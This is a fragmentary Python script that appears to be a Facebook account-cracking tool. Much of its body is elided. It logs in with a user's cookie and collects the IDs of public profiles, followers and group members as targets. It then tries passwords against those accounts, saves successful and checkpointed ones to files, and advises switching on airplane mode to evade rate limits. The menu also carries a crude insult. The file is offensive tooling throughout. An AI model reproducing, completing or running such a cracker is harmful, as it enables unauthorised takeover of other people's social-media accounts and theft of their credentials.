...
\t                     
\t               	
			{m}•{k}•{h}•{sir} Author : Zoya_Pagal {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t©©© Welcome  : [green]Cookie Lagao 😡[white] ©©©'))
		...
		print(f'  %s[%sx%s]%s LOGIN FAILED.....CHECK Cookie!!%s'%(x,k,x,m,x))
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	...
	cetak(nel('\tSelamat Raho [green]%s[white] Ngentod'%(my_name)))
	...
	print('>> 5. Hasil Crack  ')
	print('>> 0. Exit       ')
	_____Zoya__Pagal_____ = input('\n>> Pilih : ')
	if _____Zoya__Pagal_____ in ['1']:
		dump_massal()
	elif _____Zoya__Pagal_____ in ['2']:
		dump_follower()
	elif _____Zoya__Pagal_____ in ['3']:
		error()
	elif _____Zoya__Pagal_____ in ['4']:
		crack_file()
	elif _____Zoya__Pagal_____ in ['5']:
		result()
	elif _____Zoya__Pagal_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>>Sucessfull  Logout+Delete Cookies')
		exit()
	else:
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('>> How Many Id You Want Targit ? : '))
	except ValueError:
		print('>> Enter Here Public Target Id ')
		exit()
	if jum<1 or jum>100:
	...
	for met in range(jum):
		yz+=1
		kl = input('>> Enter Public Id '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		...
		print(f'>>{k} Unlisted Friendship {x}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
	try:
		...
		exit()
	print('>> Choose ( me ) If you want to crack your own followers ')
...
def grup():
	...
	if berr2=='Login Facebook':
		print(balmond+m+" Please Airplane Mode And Try Again..
")
		time.sleep(0.5)
		crack_grup()
	elif berr2=='Error':
...
def grup1(urls):
	use = []
	ses = requests.Session()
	print(""+balmond+m+" \x1b[1;94mIf Ids Stopped, Airplane Mode 5 Seconds")
	print(balmond+m+" \x1b[1;94mCurrently Collecting ID")
...
def crack_file():
	try:vin = os.listdir('DUMP')
		...
		back()
	if len(vin)==0:
		print('>> You Not Have A File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
...
#	else:
#		taplikasi.append('no')
	pwplus=input('>> Do You Want Manual Password ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Enter an additional password of at least 6 characters\n[[cyan]•[white]] Contoh :[green] Khan123,Khan1122,Khan1234[white] '))
...
def passwrd():
	...
	print(f'>> On AirPlan Mode On Every {m}500{x} Idz\n')
...
def ceker(idf,pw):
	...
	try:
		...
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Unable to Check (Check Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
def cek_opsi():
	c = len(akun)
	hu = 'There are %s Accounts To Check\nBefore Starting, Airplane Mode/Change Sim Card First'%(c)
		...
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Check Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
...
def cek_apk(session,cookie):
	...
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] There Are No Expire apps.")
	else:
